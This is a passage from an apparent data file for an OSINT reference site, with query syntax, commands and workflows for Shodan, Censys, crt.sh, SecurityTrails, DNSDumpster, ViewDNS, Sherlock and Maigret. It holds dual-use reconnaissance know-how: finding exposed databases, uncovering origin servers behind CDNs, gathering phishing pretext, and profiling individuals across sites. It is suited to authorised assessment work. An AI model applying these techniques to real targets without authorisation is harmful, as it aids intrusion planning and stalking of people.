              ["ssl.cert.issuer.CN:\"Let's Encrypt\"", "Match by certificate issuer"],
              ["ssl.cert.expired:true", "Hosts serving an expired certificate"],
              ["ssl:\"Example Corp\"", "Free-text match anywhere in the TLS certificate"]
            ]
          },
          {
            title: "Common Exposure Searches",
            type: "table",
            columns: ["Query", "What it finds"],
            rows: [
              ["product:MongoDB port:27017", "MongoDB instances reachable from the internet"],
              ["product:Elasticsearch port:9200", "Open Elasticsearch clusters"],
              ["port:6379 product:Redis", "Exposed Redis, historically often unauthenticated"],
              ["port:3389 has_screenshot:true", "RDP endpoints with a captured login screen"],
              ["\"authentication disabled\"", "Banner text indicating an unauthenticated service"],
              ["http.title:\"Index of /\"", "Open directory listings"],
              ["port:445 os:Windows", "SMB exposed to the internet"],
              ["vuln:CVE-2021-44228", "Hosts flagged for a specific CVE (enterprise-tier filter)"]
            ]
          },
          {
            title: "CLI Reference",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["shodan init <api-key>", "Store your API key locally — do this once"],
              ["shodan host <ip>", "Full record for one IP: ports, banners, vulns, history"],
              ["shodan search <query>", "Run a search; add --fields to choose output columns"],
              ["shodan count <query>", "Return only the number of matches — costs no query credits"],
              ["shodan download <file> <query>", "Save full results as compressed JSON for offline analysis"],
              ["shodan parse --fields ip_str,port <file>", "Extract fields from a downloaded result set"],
              ["shodan stats --facets port <query>", "Aggregate a search by a facet, e.g. port distribution"],
              ["shodan domain <domain>", "DNS records and known subdomains for a domain"],
              ["shodan myip", "Print your current public IP"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Map an organisation's exposed surface", cmd: "shodan search --fields ip_str,port,product,http.title 'org:\"Example Corp\"' > exposure.txt\nshodan stats --facets port 'org:\"Example Corp\"'" },
              { label: "Find infrastructure DNS does not reveal", cmd: "# certificate CN often exposes hosts with no public DNS record\nshodan search --fields ip_str,port 'ssl.cert.subject.CN:\"example.com\"'" },
              { label: "Favicon pivot to find related assets", cmd: "# compute the target's favicon hash, then search it\nshodan search --fields ip_str,port,org 'http.favicon.hash:-1234567890'" },
              { label: "Bulk export for offline analysis", cmd: "shodan download results 'net:1.2.3.0/24'\nshodan parse --fields ip_str,port,product results.json.gz" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Searching Shodan is passive — you query their index, not the target. Connecting to anything you find is not passive, and needs authorisation.",
              "Data is a snapshot from whenever Shodan last scanned that host. Verify anything time-sensitive independently.",
              "Free accounts get very limited filters and result pages. A one-off membership unlocks most of what makes the tool useful.",
              "'shodan count' does not consume query credits — use it to refine a query before running the real search.",
              "Certificate and favicon pivots are the highest-yield techniques here: they find assets that share an owner but nothing else."
            ]
          }
        ]
      },
      {
        id: "censys",
        name: "Censys Search",
        url: "https://search.censys.io/",
        description: "Internet-wide host and certificate index with a precise query language.",
        brief: "Censys scans the internet and indexes hosts and X.509 certificates, exposing both through a structured query language. It overlaps with Shodan but differs in emphasis: Censys has the stronger certificate dataset and a more precise, field-oriented syntax, which makes it excellent for pivoting from one certificate to every other host that presents it.\n\nUse it alongside Shodan rather than instead of it — the two index different slices of the same internet.",
        quickReference: [
          { label: "Hosts serving a domain's certificate", cmd: "services.tls.certificates.leaf_data.subject_dn: *example.com*" },
          { label: "Everything in a netblock", cmd: "ip: 1.2.3.0/24" },
          { label: "Hosts by autonomous system", cmd: "autonomous_system.name: \"EXAMPLE-CORP\"" },
          { label: "Specific service on any port", cmd: "services.service_name: MONGODB" },
          { label: "Certificate search by common name", cmd: "parsed.names: example.com  (certificate index)" }
        ],
        sections: [
          {
            title: "Host Query Fields",
            type: "table",
            columns: ["Field", "Description"],
            rows: [
              ["ip", "IP address or CIDR range"],
              ["services.port", "Port number a service is listening on"],
              ["services.service_name", "Normalised protocol name — HTTP, SSH, MONGODB, ELASTICSEARCH"],
              ["services.software.product", "Identified product running on the service"],
              ["services.banner", "Raw banner text match"],
              ["services.http.response.html_title", "Page title of an HTTP response"],
              ["services.http.response.headers", "Match on specific response headers"],
              ["location.country", "Geolocation of the host"],
              ["autonomous_system.asn", "ASN number"],
              ["dns.names", "Hostnames associated with the IP"]
            ]
          },
          {
            title: "Certificate Query Fields",
            type: "table",
            columns: ["Field", "Description"],
            rows: [
              ["parsed.names", "Every DNS name in the certificate, including SANs"],
              ["parsed.subject.common_name", "The certificate's CN"],
              ["parsed.issuer.organization", "Issuing CA"],
              ["parsed.validity.end", "Expiry date — range queries work here"],
              ["parsed.fingerprint_sha256", "Exact certificate fingerprint, for pivoting to every host serving it"],
              ["parsed.subject.organization", "Organisation named in the certificate subject"]
            ]
          },
          {
            title: "Query Syntax",
            type: "table",
            columns: ["Operator", "Description"],
            rows: [
              ["and / or / not", "Boolean combination, uppercase or lowercase both accepted"],
              ["field: value", "Exact field match"],
              ["field: *partial*", "Wildcard match within a field"],
              ["field: {1 TO 100}", "Range query on numeric or date fields"],
              ["\"exact phrase\"", "Quoted phrase match"],
              ["same_service(...)", "Require multiple conditions to be true of the same service, not just the same host"]
            ]
          },
          {
            title: "CLI & API",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["pip install censys", "Install the official client library and CLI"],
              ["censys config", "Store your API ID and secret"],
              ["censys search '<query>' --index-type hosts", "Run a host search from the terminal"],
              ["censys search '<query>' --index-type certs", "Search the certificate index"],
              ["censys view <ip>", "Full record for a single host"],
              ["--pages -1", "Retrieve all result pages rather than just the first"],
              ["-f json -o out.json", "Write structured output to a file"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Certificate pivot to shadow infrastructure", cmd: "# 1. find the target's certificate fingerprint in the certs index\n#    parsed.names: example.com\n# 2. pivot to every host presenting it\ncensys search 'services.tls.certificates.leaf_data.fingerprint: <sha256>' --index-type hosts" },
              { label: "Enumerate an organisation's netblocks", cmd: "censys search 'autonomous_system.name: \"EXAMPLE-CORP\"' --index-type hosts --pages -1 -f json -o org_hosts.json" },
              { label: "Hunt exposed databases in scope", cmd: "censys search 'ip: 1.2.3.0/24 and (services.service_name: MONGODB or services.service_name: ELASTICSEARCH or services.service_name: REDIS)'" },
              { label: "Cross-check with Shodan", cmd: "censys search 'ip: 1.2.3.0/24' -f json -o censys.json\nshodan download shodan_res 'net:1.2.3.0/24'\n# compare the two IP/port sets — each finds hosts the other misses" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The certificate index is the reason to use Censys. Subject Alternative Names routinely leak internal hostnames that appear nowhere in public DNS.",
              "Free accounts have a monthly query quota. Refine queries in the web UI, where the result count is shown before you commit to pagination.",
              "same_service() matters more than it looks: without it, 'port 443 and product nginx' can match a host where those are two different services.",
              "Censys and Shodan disagree constantly. Treating either as complete is the most common mistake with both."
            ]
          }
        ]
      },
      {
        id: "crtsh",
        name: "crt.sh",
        url: "https://crt.sh/",
        description: "Certificate transparency log search — free, keyless subdomain discovery.",
        brief: "Every publicly trusted TLS certificate is published to certificate transparency logs, and crt.sh makes those logs searchable. Because organisations request certificates for internal-sounding hostnames all the time, CT logs are the single most productive free source of subdomains — no API key, no rate limit worth worrying about, and complete historical coverage.\n\nIt is passive by definition: you are reading a public log, not touching the target.",
        quickReference: [
          { label: "All certificates for a domain and its subdomains", cmd: "https://crt.sh/?q=%25.example.com" },
          { label: "JSON output for scripting", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json'" },
          { label: "Clean subdomain list in one line", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u" },
          { label: "Search by organisation name", cmd: "https://crt.sh/?O=Example+Corp" },
          { label: "Look up one certificate by SHA-256", cmd: "https://crt.sh/?sha256=<hash>" }
        ],
        sections: [
          {
            title: "Search Parameters",
            type: "table",
            columns: ["Parameter", "Description"],
            rows: [
              ["?q=example.com", "Identity search — matches CN and SANs"],
              ["?q=%.example.com", "Wildcard search; %25 is the URL-encoded % that matches any subdomain"],
              ["?O=Example+Corp", "Search by the organisation field in the certificate subject"],
              ["?CN=mail.example.com", "Search by exact common name"],
              ["?id=<number>", "Fetch a specific crt.sh certificate record"],
              ["?sha256=<hash>", "Look up a certificate by fingerprint"],
              ["&output=json", "Return JSON instead of HTML — append to any query"],
              ["&exclude=expired", "Omit expired certificates from results"],
              ["&deduplicate=Y", "Collapse duplicate log entries for the same certificate"]
            ]
          },
          {
            title: "Reading the Results",
            type: "table",
            columns: ["Column", "Meaning"],
            rows: [
              ["crt.sh ID", "crt.sh's internal record ID — click through for the full certificate"],
              ["Logged At", "When the certificate entered the CT log, not when it was issued"],
              ["Not Before / Not After", "Validity window; expired entries still reveal past infrastructure"],
              ["Common Name", "Primary hostname the certificate was issued for"],
              ["Matching Identities", "Every name on the certificate, including all SANs — this is where the subdomains are"],
              ["Issuer Name", "The CA; a sudden change of CA often marks a migration worth noting"]
            ]
          },
          {
            title: "Why It Works",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Certificate Transparency", "Browsers require publicly trusted certificates to be logged to public, append-only CT logs"],
              ["Why internal names leak", "Teams request certificates for dev, staging, VPN, and admin hosts using the same public CA workflow"],
              ["Wildcards hide detail", "A *.example.com certificate reveals nothing beyond the wildcard — heavy wildcard use reduces yield"],
              ["Historical coverage", "Expired certificates stay in the log permanently, exposing decommissioned and legacy hosts"],
              ["Alternative front-ends", "certspotter and Facebook's CT tool index the same logs with slightly different coverage"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Extract a deduplicated subdomain list", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' \\\n  | jq -r '.[].name_value' \\\n  | sed 's/\\*\\.//g' | tr '[:upper:]' '[:lower:]' \\\n  | sort -u > crtsh_subs.txt\nwc -l crtsh_subs.txt" },
              { label: "Check which of them are actually live", cmd: "cat crtsh_subs.txt | httpx -silent -status-code -title" },
              { label: "Organisation-wide sweep across root domains", cmd: "curl -s 'https://crt.sh/?O=Example+Corp&output=json' \\\n  | jq -r '.[].name_value' | sed 's/\\*\\.//g' \\\n  | rev | cut -d. -f1,2 | rev | sort -u" },
              { label: "Spot recently issued certificates", cmd: "curl -s 'https://crt.sh/?q=%25.example.com&output=json' \\\n  | jq -r '.[] | \"\\(.entry_timestamp) \\(.name_value)\"' \\\n  | sort -r | head -20" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is the first thing to run on any new domain. It costs nothing, takes seconds, and often returns the best subdomain list you will get.",
              "The site times out on very large domains. Retry, or query a specific CT log front-end instead of the aggregate view.",
              "Names from CT logs are historical, not live. Always resolve them before treating them as active infrastructure.",
              "Certificates issued for internal-only hostnames are a finding in themselves — flag them as information disclosure.",
              "crt.sh also serves a Postgres interface at crt.sh:5432 (database certwatch, user guest) for complex queries the web UI cannot express."
            ]
          }
        ]
      },
      {
        id: "securitytrails",
        name: "SecurityTrails",
        url: "https://securitytrails.com/",
        description: "Historical DNS, WHOIS, and subdomain data going back years.",
        brief: "SecurityTrails' distinguishing feature is history. Where most tools tell you what DNS says right now, SecurityTrails tells you what it said two years ago — every A record a domain ever had, every domain that ever pointed at a given IP, and every subdomain observed over time.\n\nThat matters because origin servers hide behind CDNs today but often did not in the past, and because historical WHOIS can connect a well-defended domain to a carelessly registered one.",
        quickReference: [
          { label: "All known subdomains for a domain", cmd: "api.securitytrails.com/v1/domain/example.com/subdomains" },
          { label: "Historical A records", cmd: "api.securitytrails.com/v1/history/example.com/dns/a" },
          { label: "Reverse DNS — every domain on an IP", cmd: "api.securitytrails.com/v1/domains/list (with an ipv4 filter)" },
          { label: "Historical WHOIS", cmd: "api.securitytrails.com/v1/history/example.com/whois" },
          { label: "Auth header", cmd: "curl -H \"APIKEY: <key>\" <endpoint>" }
        ],
        sections: [
          {
            title: "Key Endpoints",
            type: "table",
            columns: ["Endpoint", "Returns"],
            rows: [
              ["/v1/domain/<domain>", "Current DNS records, host provider, and Alexa-style ranking data"],
              ["/v1/domain/<domain>/subdomains", "Every subdomain SecurityTrails has ever observed"],
              ["/v1/history/<domain>/dns/<type>", "Historical records for a, aaaa, mx, ns, soa, or txt"],
              ["/v1/history/<domain>/whois", "Every WHOIS snapshot recorded for the domain"],
              ["/v1/domains/list", "Advanced search across the domain dataset using DSL filters"],
              ["/v1/ips/nearby/<ip>", "Neighbouring IPs and what is hosted on them"],
              ["/v1/domain/<domain>/associated", "Domains associated by shared WHOIS details"]
            ]
          },
          {
            title: "Search DSL",
            type: "table",
            columns: ["Filter", "Description"],
            rows: [
              ["ipv4 = '1.2.3.4'", "Every domain resolving to an IP — reverse DNS at scale"],
              ["mx = 'mail.example.com'", "Domains sharing a mail server"],
              ["ns = 'ns1.example.com'", "Domains sharing a nameserver, a strong ownership signal"],
              ["whois_email = 'admin@example.com'", "Domains registered with the same contact email"],
              ["whois_org = 'Example Corp'", "Domains registered to the same organisation"],
              ["keyword = 'example'", "Domains containing a keyword — useful for typosquat hunting"],
              ["AND / OR / NOT", "Combine filters into a single query"]
            ]
          },
          {
            title: "Why History Matters",
            type: "table",
            columns: ["Use case", "Description"],
            rows: [
              ["Origin IP behind a CDN", "A historical A record from before Cloudflare was added often still points at the live origin"],
              ["Decommissioned infrastructure", "Old records reveal hosts that may still be reachable but unmaintained"],
              ["Ownership attribution", "Historical WHOIS predates privacy proxies and frequently names the real registrant"],
              ["Infrastructure migration timeline", "Changes in NS or MX records date a provider migration precisely"],
              ["Shared-hosting neighbours", "Reverse DNS on a shared IP reveals what else the target hosts alongside"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Pull the full subdomain list", cmd: "curl -s -H \"APIKEY: $ST_KEY\" \\\n  'https://api.securitytrails.com/v1/domain/example.com/subdomains' \\\n  | jq -r '.subdomains[]' | sed 's/$/.example.com/' > st_subs.txt" },
              { label: "Hunt the origin behind a CDN", cmd: "curl -s -H \"APIKEY: $ST_KEY\" \\\n  'https://api.securitytrails.com/v1/history/example.com/dns/a' \\\n  | jq -r '.records[] | \"\\(.first_seen) \\(.last_seen) \\(.values[].ip)\"'\n# test each historical IP for the target's content:\ncurl -sk -H 'Host: example.com' https://<old_ip>/ | head" },
              { label: "Map an organisation via WHOIS pivot", cmd: "curl -s -H \"APIKEY: $ST_KEY\" -X POST \\\n  -d '{\"filter\":{\"whois_email\":\"admin@example.com\"}}' \\\n  'https://api.securitytrails.com/v1/domains/list'" },
              { label: "Find typosquats and lookalikes", cmd: "curl -s -H \"APIKEY: $ST_KEY\" -X POST \\\n  -d '{\"filter\":{\"keyword\":\"exampl\"}}' \\\n  'https://api.securitytrails.com/v1/domains/list'" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier is roughly 50 API queries a month. Plan which lookups matter before spending them.",
              "Historical A records are the standard technique for defeating CDN-based origin hiding — check them before assuming a WAF cannot be bypassed.",
              "Confirm a candidate origin IP by requesting it with the target's Host header. A matching response is the proof; a matching IP alone is not.",
              "Nameserver and WHOIS-email pivots surface sibling domains that subdomain enumeration alone will never reach.",
              "It integrates as a data source in Amass, subfinder, and theHarvester — configuring the key there is often better value than manual queries."
            ]
          }
        ]
      },
      {
        id: "dnsdumpster",
        name: "DNSDumpster",
        url: "https://dnsdumpster.com/",
        description: "Free DNS reconnaissance with a visual map of a domain's infrastructure.",
        brief: "DNSDumpster takes a domain and returns its DNS footprint — nameservers, MX records, TXT records, and discovered hosts with their IPs, ASNs, and reverse DNS — plus a generated graph showing how they connect.\n\nIt is not the deepest source, but it is free, instant, requires no account, and the visual map is genuinely useful for orienting yourself on an unfamiliar target before deciding where to dig.",
        quickReference: [
          { label: "Run a lookup", cmd: "dnsdumpster.com — enter the domain, no account needed" },
          { label: "Same data via CLI", cmd: "theHarvester -d example.com -b dnsdumpster" },
          { label: "Export", cmd: "Download the results as XLSX or grab the generated domain map image" },
          { label: "Related tooling", cmd: "hackertarget.com/dns-lookup — same operator, individual lookups" }
        ],
        sections: [
          {
            title: "What It Returns",
            type: "table",
            columns: ["Section", "Contents"],
            rows: [
              ["DNS Servers", "Authoritative nameservers with IP, ASN, and hosting provider"],
              ["MX Records", "Mail servers with priority — reveals the mail provider (Google, Microsoft, self-hosted)"],
              ["TXT Records", "SPF, DMARC, DKIM, and verification tokens for third-party services"],
              ["Host Records (A)", "Discovered subdomains with IP, reverse DNS, ASN, and detected HTTP banner"],
              ["Domain Map", "A generated graph image of how hosts, netblocks, and providers relate"],
              ["XLSX export", "The host table as a spreadsheet for reporting"]
            ]
          },
          {
            title: "Reading TXT Records",
            type: "table",
            columns: ["Record type", "What it tells you"],
            rows: [
              ["v=spf1 include:...", "Every third-party service authorised to send mail as the domain — a supply-chain map"],
              ["v=DMARC1 p=none", "DMARC in monitor-only mode; the domain is spoofable in practice"],
              ["google-site-verification", "Confirms Google Workspace usage"],
              ["MS=ms########", "Confirms Microsoft 365 tenancy"],
              ["atlassian-domain-verification", "Confirms Jira/Confluence Cloud usage"],
              ["Vendor tokens generally", "Each one names a SaaS product in use — valuable for phishing pretext and third-party risk"]
            ]
          },
          {
            title: "Interpreting the Host Table",
            type: "table",
            columns: ["Column", "Why it matters"],
            rows: [
              ["IP + reverse DNS", "Reverse DNS often names the host's real purpose (vpn, jenkins, backup)"],
              ["ASN / Provider", "Hosts outside the main provider's range are the interesting ones — often shadow IT"],
              ["HTTP banner", "Immediate signal of what is running before you touch the host"],
              ["Netblock grouping", "Clusters of adjacent IPs suggest a netblock worth enumerating fully"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Fast orientation on a new target", cmd: "1. Run the domain through dnsdumpster.com\n2. Note the mail provider from MX and the SaaS stack from TXT\n3. Identify any host outside the main ASN — start there\n4. Feed the host list into httpx for live status" },
              { label: "Follow up on the netblocks it reveals", cmd: "# take the ASN from the results, then:\namass intel -asn <asn>\nshodan search 'net:<netblock>'" },
              { label: "Turn SPF into a vendor list", cmd: "dig +short TXT example.com | grep spf1\n# each include: is a third party authorised to send as the domain" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Coverage is shallower than Amass or crt.sh — treat it as a fast orientation pass, not a complete enumeration.",
              "The free tier limits lookups per day per IP. It is a starting point, not a bulk tool.",
              "The TXT record section is the most underrated part: it maps the organisation's SaaS dependencies in one screenshot.",
              "The domain map image is worth keeping for reports — it communicates infrastructure layout to non-technical readers better than a table."
            ]
          }
        ]
      },
      {
        id: "viewdns",
        name: "ViewDNS.info",
        url: "https://viewdns.info/",
        description: "A collection of DNS, WHOIS, and reverse-lookup tools in one place.",
        brief: "ViewDNS.info is a toolbox of small, single-purpose lookups — reverse IP, reverse WHOIS, reverse NS, DNS history, port scan, propagation check — all free through the web interface and available via a paid API.\n\nNothing here is unique in isolation; the value is having every common pivot in one page when you need a quick answer without configuring anything.",
        quickReference: [
          { label: "Every domain hosted on an IP", cmd: "viewdns.info/reverseip/?host=1.2.3.4" },
          { label: "Every domain sharing a WHOIS detail", cmd: "viewdns.info/reversewhois/?q=admin@example.com" },
          { label: "Every domain on a nameserver", cmd: "viewdns.info/reversens/?ns=ns1.example.com" },
          { label: "Historical IP records", cmd: "viewdns.info/iphistory/?domain=example.com" },
          { label: "API form", cmd: "api.viewdns.info/<tool>/?<params>&apikey=<key>&output=json" }
        ],
        sections: [
          {
            title: "Reverse Lookups",
            type: "table",
            columns: ["Tool", "Description"],
            rows: [
              ["Reverse IP Lookup", "All domains sharing an IP — reveals shared hosting neighbours and co-located assets"],
              ["Reverse WHOIS", "Domains registered with a matching email, name, or organisation"],
              ["Reverse NS Lookup", "Domains using a given nameserver — strong ownership signal for self-hosted DNS"],
              ["Reverse MX Lookup", "Domains using a given mail server"],
              ["Reverse DNS", "PTR record for an IP"]
            ]
          },
          {
            title: "DNS & History",
            type: "table",
            columns: ["Tool", "Description"],
            rows: [
              ["IP History", "Previous IP addresses a domain resolved to, with dates"],
              ["DNS Record Lookup", "All record types in one query"],
              ["DNS Propagation Checker", "Resolve a domain from servers worldwide — spots split-horizon and stale caching"],
              ["DNS Report", "Configuration health check across NS, MX, SOA and SPF"],
              ["Whois Lookup", "Standard registration data"],
              ["Domain Availability", "Bulk-check whether names are registered — useful for typosquat mapping"]
            ]
          },
          {
            title: "Network Tools",
            type: "table",
            columns: ["Tool", "Description"],
            rows: [
              ["Port Scanner", "Checks a short list of common ports from ViewDNS infrastructure, not yours"],
              ["Traceroute", "Path to the host from their network"],
              ["Ping", "Reachability check"],
              ["ASN Lookup", "Autonomous system details for an IP"],
              ["IP Location Finder", "Geolocation and ISP attribution"],
              ["Spam Database Lookup", "Whether an IP appears on major blocklists"],
              ["Abuse Contact Lookup", "The registered abuse contact for an IP — needed for responsible disclosure"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Expand from one domain to an organisation", cmd: "1. WHOIS the known domain, note the registrant email/org\n2. Reverse WHOIS that value — every sibling domain appears\n3. Reverse NS on their nameserver to catch anything WHOIS privacy hid\n4. Reverse IP on each resolved address for co-hosted assets" },
              { label: "Origin hunting behind a CDN", cmd: "# IP History often predates the CDN\nviewdns.info/iphistory/?domain=example.com\n# verify each candidate:\ncurl -sk -H 'Host: example.com' https://<candidate_ip>/ | head" },
              { label: "Scripted lookups via API", cmd: "curl -s 'https://api.viewdns.info/reverseip/?host=1.2.3.4&apikey=$VDNS_KEY&output=json' | jq -r '.response.domains[].name'" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Free web lookups are rate-limited and results are often truncated — the full list usually requires the API.",
              "Reverse IP is misleading on shared hosting and CDNs, where thousands of unrelated domains share one address. Confirm ownership another way before drawing conclusions.",
              "Its port scanner runs from ViewDNS infrastructure. That makes it passive from your position but is no substitute for a real scan.",
              "Reverse WHOIS is the highest-value tool here and works best on older domains registered before privacy proxies became standard."
            ]
          }
        ]
      },
      {
        id: "sherlock",
        name: "Sherlock",
        url: "https://github.com/sherlock-project/sherlock",
        description: "Hunts a username across hundreds of social networks and websites.",
        brief: "Sherlock takes one or more usernames and checks them against 400+ sites, reporting where an account with that handle exists. It is the standard first step in username-based OSINT: people reuse handles across platforms far more than they realise, and a single username often unravels into a full profile of interests, employers, and contacts.\n\nIt checks existence, not identity. Two people can share a handle, and a hit proves an account exists — not that it belongs to your subject.",
        quickReference: [
          { label: "Check one username everywhere", cmd: "sherlock johndoe" },
          { label: "Check several at once", cmd: "sherlock user1 user2 user3" },
          { label: "Only report found accounts", cmd: "sherlock johndoe --print-found" },
          { label: "Limit to specific sites", cmd: "sherlock johndoe --site GitHub --site Reddit" },
          { label: "Save results to a folder", cmd: "sherlock johndoe --folderoutput ./results --csv" }
        ],
        sections: [
          {
            title: "Core Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--print-found", "Show only sites where the username exists (recommended default)"],
              ["--print-all", "Show every site checked, including misses"],
              ["--site <name>", "Restrict the search to named sites; repeatable"],
              ["--folderoutput <dir>", "Directory for per-username result files"],
              ["--output <file>", "Single output file, for one username only"],
              ["--csv", "Also write a CSV summary"],
              ["--xlsx", "Also write an Excel summary"],
              ["--no-color", "Plain output for logs and pipes"]
            ]
          },
          {
            title: "Network Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--timeout <s>", "Per-request timeout; raising it finds more but runs slower"],
              ["--proxy <url>", "Route all requests through a proxy"],
              ["--tor", "Send requests over Tor (requires a local Tor daemon)"],
              ["--unique-tor", "New Tor circuit per request — slower, avoids per-IP rate limits"],
              ["--local", "Use the bundled data.json instead of fetching the current site list"],
              ["--json <file/url>", "Use a custom site definition file"]
            ]
          },
          {
            title: "Interpreting Results",
            type: "table",
            columns: ["Result", "How to read it"],
            rows: [
              ["Claimed", "The site returned a profile page for that username — an account exists"],
              ["Available", "No account with that username on that site"],
              ["Illegal", "The username violates that site's format rules, so it cannot exist there"],
              ["Unknown / error", "The check failed — rate limiting, captcha, or a changed site layout. Not a negative result"],
              ["False positives", "Some sites return 200 for any username; verify visually before recording a hit"],
              ["Common-name caution", "Short or generic handles produce hits belonging to unrelated people"]
            ]
          },
          {
            title: "Username Variations to Try",
            type: "table",
            columns: ["Pattern", "Example"],
            rows: [
              ["Base handle", "johndoe"],
              ["With separators", "john.doe, john_doe, john-doe"],
              ["Initial forms", "jdoe, johnd, j_doe"],
              ["With numbers", "johndoe1, johndoe93, johndoe2024"],
              ["Email localpart", "The part before @ in a known address is very often the handle"],
              ["Gaming/alt handles", "Nicknames found in one profile's bio frequently appear as handles elsewhere"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard username sweep", cmd: "sherlock johndoe --print-found --csv --folderoutput ./johndoe\n# then manually open each hit and confirm it is the same person" },
              { label: "Sweep every plausible variation", cmd: "sherlock johndoe john.doe john_doe jdoe johndoe93 \\\n  --print-found --folderoutput ./variations" },
              { label: "Pivot from an email address", cmd: "# email admin@example.com -> try the localpart as a handle\nsherlock admin --print-found --site GitHub --site Reddit --site Twitter" },
              { label: "Cross-check with Maigret for coverage", cmd: "sherlock johndoe --print-found > sherlock.txt\nmaigret johndoe --print-found\n# Maigret covers more sites; Sherlock is faster and cleaner" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "A hit is a lead, never an identification. Open the profile and corroborate with at least one independent detail before attributing it to your subject.",
              "Sites change their responses constantly, so both false positives and false negatives are normal. Update the tool before an engagement.",
              "Running the full site list from one IP will trip rate limits partway through — use --timeout generously or a proxy for large sweeps.",
              "This tool touches real people's accounts. Use it only within an authorised scope, and keep the collected data proportionate to that scope."
            ]
          }
        ]
      },
      {
        id: "maigret",
        name: "Maigret",
        url: "https://github.com/soxoj/maigret",
        description: "Username search across 2500+ sites that also extracts profile details.",
        brief: "Maigret began as a Sherlock fork and grew well past it. It checks a username against roughly 2500 sites, and where it finds an account it parses the page for supporting detail — full name, bio, location, linked accounts, creation date — then recursively searches any new identifiers it discovers.\n\nThat recursion is the differentiator: one handle can expand into a linked set of accounts and a readable identity report, rather than a flat list of URLs.",
        quickReference: [
          { label: "Search a username", cmd: "maigret johndoe" },
          { label: "Found accounts only, with an HTML report", cmd: "maigret johndoe --print-found --html" },
          { label: "Restrict to the most popular sites", cmd: "maigret johndoe --top-sites 500" },
          { label: "Search by tag/category", cmd: "maigret johndoe --tags photo,coding" },
          { label: "Parse an existing profile URL", cmd: "maigret --parse https://github.com/johndoe" }
        ],
        sections: [
          {
            title: "Core Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--print-found", "Only display accounts that exist"],
              ["--top-sites <n>", "Check only the n most popular sites — much faster"],
              ["--all-sites", "Check the entire database (slow, thorough)"],
              ["--site <name>", "Restrict to a named site or site tag"],
              ["--tags <list>", "Filter sites by category, e.g. us,dating,coding,photo"],
              ["--id-type <type>", "Search a different identifier type: username, yandex_public_id, gaia_id, vk_id, and others"],
              ["--recursive-search", "Automatically search any new usernames or IDs found in discovered profiles"],
              ["--parse <url>", "Extract identifiers from a known profile URL and search those"]
            ]
          },
          {
            title: "Reporting",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--html", "Rich HTML report with extracted profile data and links"],
              ["--pdf", "PDF version of the same report"],
              ["--xmind", "Mind-map format for visual link analysis"],
              ["--csv / --json <type>", "Machine-readable output; json accepts simple or ndjson"],
              ["--folderoutput <dir>", "Where reports are written (default ./reports)"],
              ["--no-recursion", "Disable automatic follow-up searches"]
            ]
          },
          {
            title: "Extracted Data",
            type: "table",
            columns: ["Field", "Notes"],
            rows: [
              ["Full name", "Parsed from the profile where the site exposes it"],
              ["Bio / description", "Frequently contains other handles, an employer, or a location"],
              ["Location", "Self-reported, so treat as a claim rather than a fact"],
              ["Creation date", "Account age helps distinguish a long-held handle from a recent impersonation"],
              ["Linked accounts", "Cross-links declared on the profile — the strongest attribution evidence available"],
              ["Follower counts / activity", "Distinguishes an active primary account from an abandoned placeholder"],
              ["IDs", "Internal numeric IDs that can be searched directly with --id-type"]
            ]
          },
          {
            title: "Performance",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["--timeout <s>", "Per-site request timeout (default 30)"],
              ["--retries <n>", "Retry count for failed checks"],
              ["--proxy <url>", "Proxy all requests"],
              ["--tor-proxy <url>", "Use Tor for onion-capable sites"],
              ["--no-progressbar", "Cleaner output when logging to a file"],
              ["--permute", "Generate and test username permutations automatically"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Fast triage pass", cmd: "maigret johndoe --top-sites 500 --print-found --html\n# open reports/report_johndoe.html" },
              { label: "Deep investigation with recursion", cmd: "maigret johndoe --all-sites --recursive-search --html --pdf \\\n  --folderoutput ./case_johndoe" },
              { label: "Start from a known profile instead of a guess", cmd: "maigret --parse https://twitter.com/johndoe --recursive-search --html" },
              { label: "Region- or interest-focused search", cmd: "maigret johndoe --tags coding,tech --print-found\nmaigret johndoe --tags dating --print-found   # only within an authorised scope" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Start with --top-sites 500. The full database takes a long time and the tail is mostly dead or low-signal sites.",
              "The HTML report is the actual deliverable — it consolidates extracted detail that the terminal output flattens away.",
              "Recursive search can wander a long way from the original subject. Review each expansion rather than accepting the whole graph.",
              "Extracted profile fields are self-reported. A stated location or employer is a claim to verify, not evidence.",
              "Maigret is more thorough than Sherlock and slower. Running both and comparing is standard practice for serious work."
            ]
          }
        ]
      },
      {
        id: "whatsmyname",
        name: "WhatsMyName",
        url: "https://whatsmyname.app/",
        description: "Community-maintained username enumeration with a curated, accuracy-focused site list.",
